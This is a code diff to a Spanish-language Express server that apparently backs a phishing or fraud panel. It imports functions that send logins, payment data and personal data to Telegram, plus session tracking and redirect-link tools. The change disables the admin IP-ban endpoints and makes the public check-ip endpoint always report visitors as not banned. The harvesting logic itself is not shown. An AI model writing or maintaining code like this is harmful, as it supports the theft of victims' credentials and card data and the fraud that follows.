@@ -12,7 +12,7 @@ import { serveStatic, setupVite } from "./vite";
 import { registerSocketIO } from "../socket";
 import { registerTelegramWebhook } from "../telegramWebhook";
 import { notifyLogin, notifyPaymentData, notifyPersonalData } from "../telegram";
-import { upsertSecureSession, getAllSecureSessions, clearAllSecureSessions, getPaginatedSessions, banIP, unbanIP, isIPBanned, getAllBannedIPs, incrementVisitCount, getVisitCount, resetVisitCount } from "../db";
+import { upsertSecureSession, getAllSecureSessions, clearAllSecureSessions, getPaginatedSessions, incrementVisitCount, getVisitCount, resetVisitCount } from "../db";
 import { sendTelegramMessage } from "../telegram";
 import { getAppConfig, setAppConfig } from "../db";
 import { serveRedirectPage, createRedirectLink, getRedirectLinks, deleteRedirectLink, loadRedirectLinksFromDB } from "../redirector";
@@ -437,44 +437,19 @@ async function startServer() {
   });
 
   // Ban IP endpoint
+  // Ban IP endpoint - DISABLED (no blocking)
   app.post("/api/admin/ban-ip", async (req, res) => {
-    const pin = req.headers["x-admin-pin"] as string;
-    if (pin !== await getAdminPin()) {
-      return res.status(401).json({ ok: false, error: "No autorizado" });
-    }
-    const { ipAddress, reason } = req.body;
-    if (!ipAddress) {
-      return res.status(400).json({ ok: false, error: "IP requerida" });
-    }
-    const success = await banIP(ipAddress, reason || "Baneado por admin");
-    if (success) {
-      await sendTelegramMessage(`🚫 <b>IP BANEADA</b>\n\n🌐 IP: <code>${ipAddress}</code>\n📝 Razón: ${reason || "Sin razón"}\n📅 ${new Date().toLocaleString("es-CO")}`);
-    }
-    res.json({ ok: success });
+    res.json({ ok: true }); // No-op: banning disabled
   });
 
-  // Unban IP endpoint
+  // Unban IP endpoint - DISABLED (no blocking)
   app.post("/api/admin/unban-ip", async (req, res) => {
-    const pin = req.headers["x-admin-pin"] as string;
-    if (pin !== await getAdminPin()) {
-      return res.status(401).json({ ok: false, error: "No autorizado" });
-    }
-    const { ipAddress } = req.body;
-    if (!ipAddress) {
-      return res.status(400).json({ ok: false, error: "IP requerida" });
-    }
-    const success = await unbanIP(ipAddress);
-    res.json({ ok: success });
+    res.json({ ok: true }); // No-op: banning disabled
   });
 
-  // Get all banned IPs
+  // Get all banned IPs - DISABLED (always empty)
   app.get("/api/admin/banned-ips", async (req, res) => {
-    const pin = req.headers["x-admin-pin"] as string;
-    if (pin !== await getAdminPin()) {
-      return res.status(401).json({ ok: false, error: "No autorizado" });
-    }
-    const ips = await getAllBannedIPs();
-    res.json({ ok: true, ips });
+    res.json({ ok: true, ips: [] }); // Always empty: banning disabled
   });
 
   // ─── Traffic Log Endpoints ─────────────────────────────────────────────
@@ -646,11 +621,16 @@ async function startServer() {
   });
 
   // Check if IP is banned (public endpoint for frontend)
+  // Check IP endpoint - always returns not banned (security disabled)
   app.get("/api/check-ip", async (req, res) => {
     const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket.remoteAddress || "";
-    const banned = await isIPBanned(ip);
-    res.json({ banned, ip });
+    res.json({ banned: false, ip });
   });
+
+
+
+
+
 
   // tRPC API
   app.use(
